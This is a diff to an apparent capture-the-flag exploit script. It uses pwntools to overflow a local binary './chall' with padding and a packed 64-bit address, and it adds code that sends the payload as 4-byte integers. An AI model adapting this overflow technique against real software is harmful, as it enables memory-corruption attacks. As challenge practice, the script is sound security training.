@@ -2,6 +2,15 @@ import pwn
 from pwnlib.util.packing import p64
 from itertools import zip_longest
 
+
+def grouper(iterable, n=4, FillValue=None):
+    """
+    Recipe taken from stdlibrary docs
+    """
+    args = [iter(iterable)] * n
+    return zip_longest(*args, fillvalue=FillValue)
+
+
 PWNSIZE = 64 // 4
 p = pwn.process("./chall")
 print(str(p.recvline(), "ascii"))
@@ -39,5 +48,10 @@ assert (len(payload) < 18 * 4), "payload is too long already"
 payload += b"1" * ((19 * 4) + 4 - len(payload))
 payload += p64(address)
 print(str(payload, "ascii", "ignore"))
-split_up_payload = []
-print(split_up_payload)
+for x in map(str,
+         (int.from_bytes(y, "little", signed=False)
+          for y in
+          grouper(payload))):
+    p.sendline(x)
+
+print(p.recvline())
